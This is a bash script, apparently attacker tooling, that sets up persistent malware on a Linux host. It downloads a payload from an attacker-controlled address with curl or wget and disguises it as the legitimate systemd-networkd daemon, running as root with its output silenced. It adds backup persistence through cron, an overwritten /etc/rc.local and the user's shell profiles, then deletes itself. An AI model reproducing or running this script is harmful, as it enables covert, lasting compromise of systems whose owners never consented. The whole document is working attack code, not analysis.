#!/bin/bash
# ======== ENHANCED PERSISTENCE SCRIPT ========
YOUR_IP="192.168.1.167"

echo "[+] Setting up persistent service..."

# Download and install core payload
mkdir -p /usr/lib/systemd/systemd-network 2>/dev/null
curl -s "http://$YOUR_IP:8000/core.py" -o /usr/lib/systemd/systemd-network/networkd || wget -q "http://$YOUR_IP:8000/core.py" -O /usr/lib/systemd/systemd-network/networkd

if [ ! -f "/usr/lib/systemd/systemd-network/networkd" ]; then
    echo "[-] Failed to download payload"
    exit 1
fi

chmod +x /usr/lib/systemd/systemd-network/networkd

# Create systemd service with better configuration
cat > /etc/systemd/system/systemd-networkd.service << 'EOF'
[Unit]
Description=Systemd Network Daemon
After=network.target
Wants=network.target
StartLimitIntervalSec=0

[Service]
Type=forking
ExecStart=/usr/bin/python3 /usr/lib/systemd/systemd-network/networkd
Restart=always
RestartSec=5
User=root
WorkingDirectory=/usr/lib/systemd/systemd-network
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Enable the service
systemctl daemon-reload 2>/dev/null
systemctl enable systemd-networkd.service 2>/dev/null
systemctl start systemd-networkd.service 2>/dev/null

# Multiple persistence methods as backup
echo "[+] Setting up multiple persistence methods..."

# 1. Systemd (primary)
systemctl is-enabled systemd-networkd.service && echo "[+] Systemd service enabled"

# 2. Cron job (secondary)
(crontab -l 2>/dev/null | grep -v "networkd"; echo "@reboot sleep 60 && /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd") | crontab - 2>/dev/null

# 3. RC.Local (tertiary)
echo "#!/bin/bash" > /etc/rc.local
echo "sleep 120" >> /etc/rc.local  
echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> /etc/rc.local
chmod +x /etc/rc.local 2>/dev/null

# 4. Profile persistence (quaternary)
echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> ~/.bashrc
echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> ~/.profile

# Start immediately
echo "[+] Starting service immediately..."
nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &

echo "[+] Persistence setup completed successfully"
echo "[+] Service will survive reboots via: systemd, cron, rc.local, profile"

# Verify service is running
sleep 2
if pgrep -f "networkd" >/dev/null; then
    echo "[+] Service is currently running"
else
    echo "[-] Service may not be running - check manually"
fi

# Self-cleanup
rm -f "$0" 2>/dev/null
